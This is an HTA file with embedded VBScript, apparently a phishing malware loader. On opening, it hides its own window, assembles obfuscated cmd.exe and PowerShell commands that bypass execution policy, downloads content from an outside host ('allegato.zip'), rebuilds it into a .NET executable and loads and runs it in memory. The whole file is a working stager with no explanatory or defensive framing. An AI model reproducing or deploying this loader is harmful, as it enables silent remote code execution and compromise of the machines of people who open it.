<html>
<head>
<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" />
<script language="VBScript">
     Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        Payload = "cm"+"d.e"+"xe /c Powe"+"rShel"+"l.e"+"xe  -WindowStyle hidden -executionpolicy ByPasS -e "
        objShell.Run Payload&"",0,False
        Payload = "cm"+"d.e"+"xe /c Powe"+"rShel"+"l.e"+"xe  -WindowStyle hidden -executionpolicy ByPasS -command ""$b=(iwr -UseBasicParsing -Uri \""https://allegato.zip/A\"").Content;$s=[System.Convert]::ToBase64String($b);$u=\""TV\""+[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($s));$y=[System.Convert]::FromBase64String($u);$a=[System.Reflection.Assembly]::Load($y);$e=$a.GetTypes().Where({ $_.Name -eq 'Program' },'First').GetMethod('Main',[Reflection.BindingFlags] 'Static, Public, NonPublic');$e.Invoke($null,$null)"""
        objShell.Run Payload&"",0,False
    End Sub
RunProgram()

</script>
</html>
